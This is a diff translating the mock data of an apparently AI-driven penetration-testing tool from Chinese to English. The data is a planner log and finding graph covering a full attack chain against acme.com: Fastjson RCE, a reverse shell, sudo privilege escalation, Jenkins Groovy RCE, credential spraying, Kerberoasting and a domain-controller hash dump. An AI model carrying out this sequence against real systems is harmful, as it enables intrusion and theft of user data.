-      payload: P({ summary: "反弹 shell 成功：www-data@dmz-web01(10.0.20.15)，位于 DMZ 段" }),
+      payload: P({ summary: "Reverse shell established: www-data@dmz-web01 (10.0.20.15) in DMZ" }),
       priority: 0,
       state: "open",
       origin: "work#7",
@@ -1071,7 +1071,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa5",
       type: "fact",
-      payload: P({ summary: "sudo -l：(ALL) NOPASSWD: /usr/bin/python3 → 可提权 root" }),
+      payload: P({ summary: "sudo -l shows (ALL) NOPASSWD: /usr/bin/python3 -> root privesc" }),
       priority: 0,
       state: "open",
       origin: "work#8",
@@ -1080,7 +1080,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa6",
       type: "fact",
-      payload: P({ summary: "立足点第二网卡直连内网 10.10.10.0/24（跨越 DMZ 边界）" }),
+      payload: P({ summary: "Second NIC reaches internal 10.10.10.0/24 across DMZ boundary" }),
       priority: 0,
       state: "open",
       origin: "work#9",
@@ -1089,7 +1089,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa7",
       type: "fact",
-      payload: P({ summary: "内网存活：10.10.10.10 DC01(域控) / 10.10.10.5 FS01(SMB) / 10.10.10.20 JENKINS" }),
+      payload: P({ summary: "Live internal hosts: 10.10.10.10 DC01 (DC) / 10.10.10.5 FS01 (SMB) / 10.10.10.20 JENKINS" }),
       priority: 0,
       state: "open",
       origin: "work#9",
@@ -1098,7 +1098,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa8",
       type: "fact",
-      payload: P({ summary: "JENKINS 控制台 /script 无鉴权，可直接执行 Groovy" }),
+      payload: P({ summary: "Jenkins /script console is unauthenticated and executes Groovy" }),
       priority: 0,
       state: "open",
       origin: "work#11",
@@ -1107,7 +1107,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa9",
       type: "fact",
-      payload: P({ summary: "从 Jenkins 凭据库导出域账号 acme\\svc_deploy 明文口令" }),
+      payload: P({ summary: "Extracted plaintext domain password for acme\\svc_deploy from Jenkins" }),
       priority: 0,
       state: "open",
       origin: "work#11",
@@ -1116,7 +1116,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fa10",
       type: "fact",
-      payload: P({ summary: "Kerberoast 到 svc_sql 的 TGS，hashcat 破出口令 Sql@2020" }),
+      payload: P({ summary: "Kerberoasted svc_sql TGS ticket; hashcat cracked Sql@2020" }),
       priority: 0,
       state: "open",
       origin: "work#12",
@@ -1127,7 +1127,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fi1",
       type: "finding",
-      payload: P({ summary: "后台默认口令 admin/admin123" }),
+      payload: P({ summary: "Admin portal default credentials admin/admin123" }),
       priority: 0,
       state: "confirmed",
       origin: "work#2",
@@ -1136,7 +1136,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fi2",
       type: "finding",
-      payload: P({ summary: "SQL 注入（search q）可读 acme_prod 库" }),
+      payload: P({ summary: "SQL injection (search q) reads acme_prod database" }),
       priority: 0,
       state: "confirmed",
       origin: "work#4",
@@ -1145,7 +1145,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fi3",
       type: "finding",
-      payload: P({ summary: "IDOR：/v1/orders?id= 可越权读他人订单" }),
+      payload: P({ summary: "IDOR: /v1/orders?id= exposes other users' orders" }),
       priority: 0,
       state: "confirmed",
       origin: "work#5",
@@ -1154,7 +1154,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiSrc",
       type: "finding",
-      payload: P({ summary: "源码泄露 + 硬编码数据库凭据（sa/Acme@2021）" }),
+      payload: P({ summary: "Source code exposure + hardcoded DB credentials (sa/Acme@2021)" }),
       priority: 0,
       state: "confirmed",
       origin: "workG",
@@ -1163,7 +1163,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiRce",
       type: "finding",
-      payload: P({ summary: "shop Fastjson 反序列化 RCE，获得服务器命令执行" }),
+      payload: P({ summary: "shop Fastjson deserialization RCE yielding command execution" }),
       priority: 0,
       state: "confirmed",
       origin: "work#7",
@@ -1172,7 +1172,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiPriv",
       type: "finding",
-      payload: P({ summary: "DMZ 立足点本地提权至 root（sudo NOPASSWD 错配）" }),
+      payload: P({ summary: "Local root privesc on DMZ foothold (sudo NOPASSWD)" }),
       priority: 0,
       state: "confirmed",
       origin: "work#8",
@@ -1181,7 +1181,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiJenkins",
       type: "finding",
-      payload: P({ summary: "内部 Jenkins 未授权 Groovy → 服务器 RCE" }),
+      payload: P({ summary: "Unauthenticated internal Jenkins Groovy RCE" }),
       priority: 0,
       state: "confirmed",
       origin: "work#11",
@@ -1190,7 +1190,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiKerb",
       type: "finding",
-      payload: P({ summary: "Kerberoasting 破解域服务账号 svc_sql 口令" }),
+      payload: P({ summary: "Cracked domain service account svc_sql via Kerberoasting" }),
       priority: 0,
       state: "confirmed",
       origin: "work#12",
@@ -1199,7 +1199,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "fiDC",
       type: "finding",
-      payload: P({ summary: "拿下域控 DC01（Domain Admin）—— 内部靶标达成" }),
+      payload: P({ summary: "Compromised Domain Controller DC01 (Domain Admin) — internal objective achieved" }),
       priority: 0,
       state: "confirmed",
       origin: "work#13",
@@ -1210,7 +1210,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "h1",
       type: "hint",
-      payload: P({ summary: "后台是 Element-UI，优先跑默认口令表" }),
+      payload: P({ summary: "Admin portal uses Element-UI; test default credential list first" }),
       priority: 5,
       state: "consumed",
       origin: "mainagent",
@@ -1219,7 +1219,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "h2",
       type: "hint",
-      payload: P({ summary: "内网优先打 Jenkins：未授权 /script 直接 Groovy RCE" }),
+      payload: P({ summary: "Prioritize internal Jenkins: unauthenticated /script allows Groovy RCE" }),
       priority: 6,
       state: "consumed",
       origin: "mainagent",
@@ -1228,7 +1228,7 @@ export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
     {
       id: "h3",
       type: "hint",
-      payload: P({ summary: "源码里那组 DB 口令拿去内网喷洒，大概率通用" }),
+      payload: P({ summary: "Spray the leaked DB credentials across internal hosts; likely reused" }),
       priority: 6,
       state: "consumed",
       origin: "mainagent",
@@ -1310,14 +1310,14 @@ export const frontier: TaskNode[] = explorationGraph.nodes.filter(
 export const activity: Activity[] = [
   // planner —— 每轮完整决策链：读态势 → 拉 worker 产出对照 → 判目标 → add_intent 派方向
   // ── 第 0 轮 · 目标拆解与首批意图（2026-07-24 09:12）──
-  { seq: 1000, worker: "planner", ts: T("2026-07-24T09:12:10Z"), kind: "round", summary: "第 0 轮 · 目标拆解" },
+  { seq: 1000, worker: "planner", ts: T("2026-07-24T09:12:10Z"), kind: "round", summary: "Round 0 · Goal decomposition" },
   {
     seq: 1001,
     worker: "planner",
     ts: T("2026-07-24T09:12:25Z"),
     kind: "thinking",
     summary:
-      "graph_overview：goals 已由目标层拆好——g1「获取 acme.com 后台管理权限」、g2「读取用户敏感数据」，均 open；facts=0、recent_facts 为空（图基本空白，还没有任何 worker 产出）。范围内资产只有根域 acme.com + 一个 C 段。攻击面初判：www / admin / api / shop / vpn 五个入口。图里没有 fact，我只能做【极轻量只读探测】把初始意图说具体，绝不在 plan 里把活干了。",
+      "graph_overview: goals are decomposed — g1 (Gain admin access to acme.com) and g2 (Access sensitive user data), both open; facts=0, recent_facts empty. In-scope assets are root domain acme.com plus one /24 subnet. Initial surface: www / admin / api / shop / vpn. Running lightweight read-only probes only to scope initial intents.",
   },
   {
     seq: 1002,
@@ -1327,7 +1327,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "p0-probe",
     summary: "curl -sI https://acme.com; curl -sI https://admin.acme.com",
-    detail: "开局态势几乎空白，做 ≤3 次只读探测校准初始意图方向（不做枚举/验证，那是 worker 的活）。",
+    detail: "Initial graph is empty; run <=3 read-only probes to calibrate initial intents without doing worker-level enumeration.",
   },
   {
     seq: 1003,
@@ -1337,8 +1337,8 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "p0-probe",
     summary:
-      "acme.com → 302 → www；Server: nginx/1.24.0\nadmin.acme.com → 200，X-Powered-By 缺省，body 命中 element-ui/vue 特征",
-    detail: "admin 是独立后台登录页；确认五入口有效，可把初始意图描述写精准。",
+      "acme.com -> 302 -> www; Server: nginx/1.24.0\nadmin.acme.com -> 200, no X-Powered-By, body matches Element-UI/Vue",
+    detail: "admin is a standalone login portal; confirmed all five entry points to scope initial intents accurately.",
   },
   {
     seq: 1004,
@@ -1347,9 +1347,9 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "add_intent",
     tool_use_id: "p0-ai",
-    summary: "add_intent × 4（批量派首批探索方向）",
+    summary: "add_intent x 4 (dispatch initial exploration intents)",
     detail:
-      "intents=[\n  { summary: 'acme.com 全量子域枚举 + 存活主机端口/服务识别，摸清攻击面', asset_ids: [acme.com], priority: 6 },\n  { summary: 'admin.acme.com 后台默认口令/弱口令测试（Element-UI 登录，无验证码）', asset_ids: [admin], priority: 9 },\n  { summary: 'www.acme.com/search q 参数 SQL 注入探测', asset_ids: [www], priority: 8 },\n  { summary: 'api.acme.com 订单接口越权(IDOR)测试', asset_ids: [api], priority: 8 },\n]\nparent_ids 均空（顶层全新方向，兜底连 origin fact）。",
+      "intents=[\n  { summary: 'Full subdomain enumeration and port/service discovery on acme.com', asset_ids: [acme.com], priority: 6 },\n  { summary: 'Default and weak credential testing on admin.acme.com (Element-UI, no CAPTCHA)', asset_ids: [admin], priority: 9 },\n  { summary: 'SQL injection probing on www.acme.com/search q parameter', asset_ids: [www], priority: 8 },\n  { summary: 'Order endpoint IDOR testing on api.acme.com', asset_ids: [api], priority: 8 },\n]\nparent_ids empty (top-level directions attached to origin fact).",
   },
   {
     seq: 1005,
@@ -1358,8 +1358,8 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "add_intent",
     tool_use_id: "p0-ai",
-    summary: "4 intents created → ids=[i1, i2, i4, i5]，已连入 frontier",
-    detail: "刻意保持路线多样：i1 侦察 + i2（g1 认证路线）+ i4/i5（g2 数据路线），2 条独立机理并行，不过早收敛。",
+    summary: "4 intents created -> ids=[i1, i2, i4, i5], added to frontier",
+    detail: "Keeping exploration diverse: i1 recon + i2 (g1 auth path) + i4/i5 (g2 data path) running in parallel.",
   },
   {
     seq: 1006,
@@ -1367,18 +1367,18 @@ export const activity: Activity[] = [
     ts: T("2026-07-24T09:13:05Z"),
     kind: "text",
     summary:
-      "本轮派生首批 4 条意图：i1 资产侦察、i2 后台口令、i4 注入、i5 API 越权。g1 走 i2、g2 走 i4/i5，双目标各有独立入口在推进。等 worker 产出事实后再据血缘加码。",
+      "Dispatched the first 4 intents: i1 asset recon, i2 admin credentials, i4 SQLi, and i5 API IDOR. Both g1 and g2 now have active independent tracks.",
   },
 
   // ── 第 1 轮 · 攻击面加码（2026-07-25 14:12）──
-  { seq: 1100, worker: "planner", ts: T("2026-07-25T14:12:00Z"), kind: "round", summary: "第 1 轮 · 攻击面加码" },
+  { seq: 1100, worker: "planner", ts: T("2026-07-25T14:12:00Z"), kind: "round", summary: "Round 1 · Expanding attack surface" },
   {
     seq: 1101,
     worker: "planner",
     ts: T("2026-07-25T14:12:15Z"),
     kind: "thinking",
     summary:
-      "对照 recent_facts：workG 交回 faGit「.git 可下载，git-dumper 还原出后端源码」与 faCreds「config.php 硬编码 sa/Acme@2021（疑似内网通用）」；work#6 指纹交回 fa3「shop 命中 Fastjson 1.2.24（存在已知反序列化 RCE）」。两条【材料性新机理】：① 硬编码 DB 口令可能横跨内网复用；② Fastjson 有成熟 RCE 打法。这打开一条与现有认证/注入路线【本质不同】的入口——从 shop 直接 RCE 突破进 DMZ。先拉 faGit 详情核实产物。",
+      "Reviewing recent_facts: workG reported faGit (.git downloadable, source recovered) and faCreds (hardcoded sa/Acme@2021 in config.php); work#6 reported fa3 (shop runs Fastjson 1.2.24 with known deserialization RCE). Two new high-value vectors open a direct DMZ breach path. Inspecting faGit details first.",
   },
   {
     seq: 1102,
@@ -1387,8 +1387,8 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "node_detail",
     tool_use_id: "p1-nd",
-    summary: "node_detail(faGit) —— 核对 workG 的源码还原产物",
-    detail: "add_intent 前先看 worker 到底还原出什么，避免凭指纹臆测方向。",
+    summary: "node_detail(faGit) — inspect recovered source artifacts from workG",
+    detail: "Verify exact recovered artifacts before creating new intents.",
   },
   {
     seq: 1103,
@@ -1398,8 +1398,8 @@ export const activity: Activity[] = [
     tool: "node_detail",
     tool_use_id: "p1-nd",
     summary:
-      "faGit 证据：git-dumper 还原出 config.php / db.php / order_api.php；config.php 内 $db=['host'=>'10.10.10.5','user'=>'sa','pass'=>'Acme@2021']",
-    detail: "硬编码指向内网 10.10.10.5(FS01)，佐证 faCreds 的「内网通用」推断——RCE 落地后这组口令值得复用。",
+      "faGit evidence: git-dumper recovered config.php / db.php / order_api.php; config.php contains $db=['host'=>'10.10.10.5','user'=>'sa','pass'=>'Acme@2021']",
+    detail: "Hardcoded host points to internal 10.10.10.5 (FS01), supporting credential reuse once inside the DMZ.",
   },
   {
     seq: 1104,
@@ -1408,9 +1408,9 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "add_intent",
     tool_use_id: "p1-ai",
-    summary: "add_intent × 2（Fastjson 突破链，串行分步先派可执行一步）",
+    summary: "add_intent x 2 (Fastjson RCE chain, dispatching executable steps)",
     detail:
-      "intents=[\n  { summary: 'shop.acme.com 组件指纹深挖 + Fastjson 1.2.24 CVE 精确关联(确认 gadget 链)', asset_ids: [shop], parent_ids: [fa3], priority: 7 },\n  { summary: '构造 Fastjson 反序列化 payload 触发 shop RCE，获取反弹 shell', asset_ids: [shop], parent_ids: [fa3], priority: 9 },\n]\n注：这是强依赖串行链，已 TodoWrite 记『指纹→RCE→立足点提权』三步，本轮只派前两步（提权依赖 shell 产出，下轮再派）。",
+      "intents=[\n  { summary: 'Deep fingerprint shop.acme.com and confirm Fastjson 1.2.24 gadget chain', asset_ids: [shop], parent_ids: [fa3], priority: 7 },\n  { summary: 'Craft Fastjson deserialization payload for shop RCE and reverse shell', asset_ids: [shop], parent_ids: [fa3], priority: 9 },\n]\nNote: Sequential chain; dispatching first two steps before DMZ privilege escalation.",
   },
   {
     seq: 1105,
@@ -1419,7 +1419,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "add_intent",
     tool_use_id: "p1-ai",
-    summary: "2 intents created → ids=[i6, i7]，已由 fa3 连入血缘",
+    summary: "2 intents created -> ids=[i6, i7], linked from fa3",
   },
   {
     seq: 1106,
@@ -1427,7 +1427,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-25T14:13:00Z"),
     kind: "text",
     summary:
-      "态势升级：源码 + 硬编码内网口令 + Fastjson RCE 构成一条全新突破路线。已请目标层登记 g3「从外网突破 DMZ，建立内网立足点」，派 i6（指纹/CVE 关联）、i7（触发 RCE）。DMZ 提权一步依赖 shell，记入待办下轮派。",
+      "Escalating attack plan: leaked source, hardcoded internal DB credentials, and Fastjson RCE create a new breach path. Registered g3 (Breach DMZ and establish internal foothold) and dispatched i6 and i7.",
   },
 
   // ── 第 2 轮 · 立足点已建，转内网（2026-07-25 20:25）──
@@ -1436,7 +1436,7 @@ export const activity: Activity[] = [
     worker: "planner",
     ts: T("2026-07-25T20:25:00Z"),
     kind: "round",
-    summary: "第 2 轮 · 立足点已建，转内网",
+    summary: "Round 2 · Foothold established, pivoting internally",
   },
   {
     seq: 1201,
@@ -1444,7 +1444,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-25T20:25:18Z"),
     kind: "thinking",
     summary:
-      "对照血缘：i7 交回 fa4「反弹 shell www-data@dmz-web01(10.0.20.15)，位于 DMZ 段」；提权链交回 fa5「sudo -l 命中 NOPASSWD python3 → 可提权 root」、fa6「立足点第二网卡直连内网 10.10.10.0/24」。g3 的验收条件（突破 DMZ + 建立足点）已被 fa4+fa6 直接满足。先核实 fa6 的内网可达性再 prove_goal。",
+      "Lineage check: i7 yielded fa4 (reverse shell www-data@dmz-web01 in DMZ), fa5 (sudo NOPASSWD python3 -> root), and fa6 (second NIC on internal 10.10.10.0/24). g3 criteria are met; verifying fa6 internal reachability before prove_goal.",
   },
   {
     seq: 1202,
@@ -1453,7 +1453,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "node_detail",
     tool_use_id: "p2-nd",
-    summary: "node_detail(fa6) —— 确认双网卡与内网可达",
+    summary: "node_detail(fa6) — confirm dual-NIC and internal reachability",
   },
   {
     seq: 1203,
@@ -1462,7 +1462,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "node_detail",
     tool_use_id: "p2-nd",
-    summary: "fa6 证据：ip a → eth0 10.0.20.15(DMZ) / eth1 10.10.10.15(内网)；ping 10.10.10.10 通，跨越 DMZ 边界成立",
+    summary: "fa6 evidence: ip a -> eth0 10.0.20.15 (DMZ) / eth1 10.10.10.15 (internal); ping 10.10.10.10 succeeded",
   },
   {
     seq: 1204,
@@ -1473,7 +1473,7 @@ export const activity: Activity[] = [
     tool_use_id: "p2-pg",
     summary: "prove_goal(g3, evidence=fa6)",
     detail:
-      "reason：i7 RCE 拿到 DMZ 立足点(fa4)、fa5 提权 root、fa6 证明第二网卡直连内网并 ping 通 DC01——『突破 DMZ 建立内网立足点』验收达成。",
+      "reason: i7 RCE established DMZ foothold (fa4), fa5 escalated to root, and fa6 proved direct internal subnet reachability to DC01 — g3 met.",
   },
   {
     seq: 1205,
@@ -1482,7 +1482,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "prove_goal",
     tool_use_id: "p2-pg",
-    summary: "goal g3 → met（证据 fa6 已连入）；仍有 g1/g2/g4 未达成，任务继续",
+    summary: "goal g3 -> met (evidence fa6 linked); g1/g2/g4 still open, continuing task",
   },
   {
     seq: 1206,
@@ -1491,9 +1491,9 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "add_intent",
     tool_use_id: "p2-ai",
-    summary: "add_intent × 4（以立足点为 pivot 展开内网横向）",
+    summary: "add_intent x 4 (lateral movement from DMZ pivot)",
     detail:
-      "intents=[\n  { summary: '以 dmz-web01 为 pivot 做内网 10.10.10.0/24 主机发现与端口识别', asset_ids: [dmz-web01], parent_ids: [fa6], priority: 8 },\n  { summary: '内网横向：复用硬编码口令 sa/Acme@2021 做凭据复用与密码喷洒', parent_ids: [faCreds], priority: 8 },\n  { summary: '内部 Jenkins(10.10.10.20) 未授权 /script Groovy 执行(RCE)', parent_ids: [fa6], priority: 9 },\n  { summary: '对域服务账号做 Kerberoasting 并离线破解', parent_ids: [fa6], priority: 8 },\n]\n主机发现是前置(先派)，其余三条是并行的横向探索维度。",
+      "intents=[\n  { summary: 'Pivot via dmz-web01 for internal 10.10.10.0/24 host and port discovery', asset_ids: [dmz-web01], parent_ids: [fa6], priority: 8 },\n  { summary: 'Lateral movement: spray hardcoded credentials sa/Acme@2021 internally', parent_ids: [faCreds], priority: 8 },\n  { summary: 'Exploit unauthenticated /script Groovy RCE on internal Jenkins (10.10.10.20)', parent_ids: [fa6], priority: 9 },\n  { summary: 'Kerberoast domain service accounts and crack tickets offline', parent_ids: [fa6], priority: 8 },\n]\nHost discovery leads while the other three run as parallel lateral tracks.",
   },
   {
     seq: 1207,
@@ -1510,18 +1510,18 @@ export const activity: Activity[] = [
     ts: T("2026-07-25T20:26:20Z"),
     kind: "text",
     summary:
-      "g3 达成，攻击面从外网转入内网。已请登记 g4「内网横向，拿下内部靶标域控 DC01」，派 i9（主机发现）+ i10/i11/i12 三条并行横向。凭据复用直接锚在 faCreds 上——外网源码泄露的口令喂给内网横向。",
+      "g3 achieved; shifting from perimeter to internal network. Registered g4 (Compromise Domain Controller DC01) and dispatched i9 discovery plus parallel lateral tracks i10/i11/i12.",
   },
 
   // ── 第 3 轮 · 靶标达成复盘（2026-07-26 00:25）──
-  { seq: 1300, worker: "planner", ts: T("2026-07-26T00:25:00Z"), kind: "round", summary: "第 3 轮 · 靶标达成复盘" },
+  { seq: 1300, worker: "planner", ts: T("2026-07-26T00:25:00Z"), kind: "round", summary: "Round 3 · Target compromise review" },
   {
     seq: 1301,
     worker: "planner",
     ts: T("2026-07-26T00:25:16Z"),
     kind: "thinking",
     summary:
-      "对照本轮 worker 产出：i9→fa7「内网存活 DC01/FS01/JENKINS」；i11→fa8「Jenkins /script 无鉴权 Groovy」+ fa9「从 Jenkins 凭据库导出 acme\\svc_deploy 明文口令」；i12→fa10「Kerberoast svc_sql TGS，hashcat 破出 Sql@2020」。svc_deploy 属 Domain Admins，i13 已用其 psexec 拿下 DC01 并 secretsdump。g4 验收（拿下 DC01）应已达成，先核对 finding 证据链再盖章。",
+      "Reviewing worker output: i9->fa7 (DC01/FS01/JENKINS live); i11->fa8 (Jenkins /script unauth Groovy) + fa9 (dumped acme\\svc_deploy plaintext); i12->fa10 (Kerberoast svc_sql cracked Sql@2020). svc_deploy is Domain Admin and i13 compromised DC01 via psexec + secretsdump. Verifying finding evidence before marking g4 met.",
   },
   {
     seq: 1302,
@@ -1530,7 +1530,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "list_findings",
     tool_use_id: "p3-lf",
-    summary: "list_findings —— 核对 DC01 沦陷的确认证据",
+    summary: "list_findings — verify confirmed evidence for DC01 compromise",
   },
   {
     seq: 1303,
@@ -1540,7 +1540,7 @@ export const activity: Activity[] = [
     tool: "list_findings",
     tool_use_id: "p3-lf",
     summary:
-      "F-09「域控 DC01 完全控制 / secretsdump 导出全域哈希」critical（证据：psexec svc_deploy@10.10.10.10 + NTDS.dit dump）；上游链 fa9→fa10→i13 完整",
+      "F-09 (DC01 full compromise / secretsdump domain hashes) critical (evidence: psexec svc_deploy@10.10.10.10 + NTDS.dit dump); lineage fa9->fa10->i13 complete",
   },
   {
     seq: 1304,
@@ -1551,7 +1551,7 @@ export const activity: Activity[] = [
     tool_use_id: "p3-pg",
     summary: "prove_goal(g4, evidence=F-09)",
     detail:
-      "reason：Jenkins 泄露 svc_deploy(Domain Admin) → psexec 控制 DC01 → secretsdump 全域哈希，F-09 已确认，『拿下内部靶标域控 DC01』达成。",
+      "reason: Jenkins leaked svc_deploy (Domain Admin) -> psexec DC01 -> secretsdump full domain hashes; F-09 confirmed, g4 achieved.",
   },
   {
     seq: 1305,
@@ -1560,7 +1560,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "prove_goal",
     tool_use_id: "p3-pg",
-    summary: "goal g4 → met；系统提示：g2 仍 open，非最后一个目标，任务未整体收官",
+    summary: "goal g4 -> met; note: g2 is still open, task continues",
   },
   {
     seq: 1306,
@@ -1568,7 +1568,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-26T00:26:10Z"),
     kind: "text",
     summary:
-      "g4 收官，内外网链路完全打通（外网 RCE → DMZ → 内网 → 域控）。逐一比对未覆盖方向：g2「读取用户敏感数据」仍缺临门一脚，但现有 i3（后台用户接口）+ i5（API IDOR）已覆盖该方向、且都在 running。本轮无【本质不同的未覆盖新方向】——按克制原则 0 新意图，等 i3/i5 产出。",
+      "g4 completed with a full external-to-DC kill chain (External RCE -> DMZ -> Internal -> DC01). Checking remaining coverage: g2 (Access sensitive user data) is actively covered by running intents i3 (admin user API) and i5 (API IDOR). No new intents needed this round; awaiting i3/i5 results.",
   },
 
   // ── 第 4 轮 · 后台达成，收敛 g2（2026-07-26 03:55）──
@@ -1577,7 +1577,7 @@ export const activity: Activity[] = [
     worker: "planner",
     ts: T("2026-07-26T03:55:00Z"),
     kind: "round",
-    summary: "第 4 轮 · 后台达成，收敛 g2",
+    summary: "Round 4 · Admin access met, converging on g2",
   },
   {
     seq: 1401,
@@ -1585,7 +1585,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-26T03:55:14Z"),
     kind: "thinking",
     summary:
-      "对照 recent_facts：work#2 用 faCreds 里的 Acme@2021 命中 admin 后台（i2 done），后台管理权限到手——g1 验收达成，先 prove_goal 盖章。随后做【量化验收核对】：g2「读取用户敏感数据」当前只有 i3/i5 摸到接口面、尚未真正取到批量数据，实测未达标，【禁止】prove_goal，改为提优先级补足取数意图。",
+      "Reviewing recent_facts: work#2 gained admin portal access (i2 done), satisfying g1. Marking g1 met. For g2 (Access sensitive user data), i3/i5 have reached the endpoints but have not yet verified bulk extraction, so keeping g2 open and raising priority on i3/i5.",
   },
   {
     seq: 1402,
@@ -1596,7 +1596,7 @@ export const activity: Activity[] = [
     tool_use_id: "p4-pg",
     summary: "prove_goal(g1, evidence=fa1)",
     detail:
-      "reason：i2 用外网泄露的硬编码口令 Acme@2021 成功登入 admin 后台（Element-UI），获取后台管理权限，g1 达成。",
+      "reason: i2 authenticated to the Element-UI admin portal and gained administrative access, satisfying g1.",
   },
   {
     seq: 1403,
@@ -1605,7 +1605,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "prove_goal",
     tool_use_id: "p4-pg",
-    summary: "goal g1 → met；剩余未达成：g2",
+    summary: "goal g1 -> met; remaining open goal: g2",
   },
   {
     seq: 1404,
@@ -1613,7 +1613,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-26T03:55:40Z"),
     kind: "thinking",
     summary:
-      "g2 量化核对：目标要求『读取用户敏感数据』=实际拿到批量用户记录。graph_overview 里 findings 尚无『成功导出用户数据』条目，i3/i5 均 running 未回取数结果——实测未达标。严禁以『后台已进、大体达成』提前标 met，继续派意图补足差距。",
+      "g2 verification check: requires confirmed bulk user record access. No bulk export finding is recorded yet and i3/i5 are still running, so keeping g2 open and prioritizing completion.",
   },
   {
     seq: 1405,
@@ -1622,9 +1622,9 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "add_intent",
     tool_use_id: "p4-ai",
-    summary: "add_intent × 2（收敛 g2 取数，提高优先级）",
+    summary: "add_intent x 2 (prioritize g2 data access verification)",
     detail:
-      "intents=[\n  { summary: '已登入 admin 后台，枚举用户管理/导出接口并批量拉取用户敏感字段', asset_ids: [admin], parent_ids: [fa1], priority: 9 },\n  { summary: 'api.acme.com 订单 IDOR 遍历 order_id 批量拉取用户订单/PII', asset_ids: [api], parent_ids: [fa2], priority: 9 },\n]\n注：i3/i5 已在 running，本轮以更精准的取数描述 + 提优先级(→9)加码，不重复派同义意图。",
+      "intents=[\n  { summary: 'Enumerate admin user management/export endpoints and verify bulk sensitive field access', asset_ids: [admin], parent_ids: [fa1], priority: 9 },\n  { summary: 'Iterate order_id via api.acme.com IDOR to verify bulk PII exposure', asset_ids: [api], parent_ids: [fa2], priority: 9 },\n]\nNote: Updating running intents i3/i5 to priority 9 without creating duplicates.",
   },
   {
     seq: 1406,
@@ -1633,7 +1633,7 @@ export const activity: Activity[] = [
     kind: "tool_result",
     tool: "add_intent",
     tool_use_id: "p4-ai",
-    summary: "2 intents updated → ids=[i3, i5]（优先级升至 9，描述细化为『批量取数』）",
+    summary: "2 intents updated -> ids=[i3, i5] (priority raised to 9 for bulk data verification)",
   },
   {
     seq: 1407,
@@ -1641,7 +1641,7 @@ export const activity: Activity[] = [
     ts: T("2026-07-26T03:55:58Z"),
     kind: "text",
     summary:
-      "g1 达成（4/4 里已 met 3 个：g1/g3/g4）。g2 严守量化验收——只进后台不算，必须拿到批量用户数据才盖章；已把 i3/i5 提到 priority 9 并细化为取数意图，等 worker 回传即可收官整个任务。",
+      "g1 achieved (3 of 4 goals met: g1/g3/g4). Holding strict evidence criteria for g2 until bulk user data access is confirmed via i3/i5 at priority 9.",
   },
 
   // work#1 · i1 子域枚举与端口扫描（done）
@@ -1651,7 +1651,7 @@ export const activity: Activity[] = [
     intent_id: "i1",
     ts: T("2026-07-24T09:20:00Z"),
     kind: "thinking",
-    summary: "先被动侦察子域，再对存活主机做端口/服务识别。",
+    summary: "Run passive subdomain enumeration first, then port and service discovery on live hosts.",
   },
   {
     seq: 11,
@@ -1672,8 +1672,8 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t11",
     summary:
-      "www.acme.com [200] Acme Corp\nadmin.acme.com [200] Acme Admin 登录\napi.acme.com [401]\nshop.acme.com [200]\nvpn.acme.com [200]",
-    detail: "5 个存活子域，其中 admin 是后台登录页。",
+      "www.acme.com [200] Acme Corp\nadmin.acme.com [200] Acme Admin Sign In\napi.acme.com [401]\nshop.acme.com [200]\nvpn.acme.com [200]",
+    detail: "5 live subdomains found, including the admin login portal.",
   },
   {
     seq: 13,
@@ -1694,7 +1694,7 @@ export const activity: Activity[] = [
     tool: "bash",
     tool_use_id: "t12",
     summary: "22/tcp ssh OpenSSH 8.9p1\n80/tcp http nginx 1.24.0\n443/tcp https nginx 1.24.0",
-    detail: "开放 22/80/443。",
+    detail: "Open ports: 22/80/443.",
   },
   {
     seq: 15,
@@ -1704,7 +1704,7 @@ export const activity: Activity[] = [
     kind: "tool_use",
     tool: "upsert_asset",
     tool_use_id: "t13",
-    summary: "upsert_asset × 6（子域+服务）",
